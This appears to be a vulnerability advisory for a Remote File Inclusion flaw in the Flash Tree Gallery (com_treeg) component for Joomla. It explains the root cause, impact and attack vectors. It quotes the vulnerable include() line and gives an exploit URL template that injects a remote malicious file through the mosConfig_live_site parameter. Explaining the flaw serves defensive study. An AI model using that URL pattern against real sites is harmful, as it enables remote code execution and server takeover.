Based on the provided content, here's an analysis of the vulnerability:

**Root Cause:**

*   The vulnerability is a Remote File Inclusion (RFI) in the `admin.treeg.php` file of the Flash Tree Gallery component for Joomla.
*   The vulnerable code uses an `include()` statement with a path that includes the `$mosConfig_live_site` variable without proper sanitization.

**Weaknesses/Vulnerabilities:**

*   **Remote File Inclusion (RFI):** The primary vulnerability is that the `$mosConfig_live_site` variable, which is used in the `include()` statement, can be manipulated by an attacker through a GET request. This allows an attacker to include a remote file containing malicious code.

**Impact of Exploitation:**

*   **Arbitrary Code Execution:** By including a malicious file from a remote server, the attacker can execute arbitrary code on the server hosting the vulnerable Joomla installation. This can lead to complete compromise of the server and the web application.
*   **Data Theft/Manipulation:** Once the attacker has control of the server, they can steal sensitive data or manipulate data stored within the application or database.
*   **Malware Installation:** The attacker could use the vulnerability to install malware on the server or use the compromised server as part of a botnet.

**Attack Vectors:**

*   **HTTP GET Request:** The attacker injects a malicious URL into the `mosConfig_live_site` parameter in an HTTP GET request.
*   **Targeted File:** The vulnerable file is `administrator/components/com_treeg/admin.treeg.php`.

**Required Attacker Capabilities/Position:**

*   **Network Access:** The attacker needs network access to the vulnerable web server.
*   **Basic HTTP knowledge:** The attacker needs to be able to craft an HTTP GET request.
*   **No authentication required:** The exploit doesn't require prior authentication to the Joomla administration panel.

**Technical Details:**
* The vulnerable line of code is: `include( "$mosConfig_live_site/components/com_treeg/about.html" );`
*  The exploit is triggered by crafting a URL like: `http://localhost/[path]/administrator/components/com_treeg/admin.treeg.php?mosConfig_live_site=[evilcode]` where `[evilcode]` is the malicious remote file URL.

This exploit allows for full remote code execution on the server.
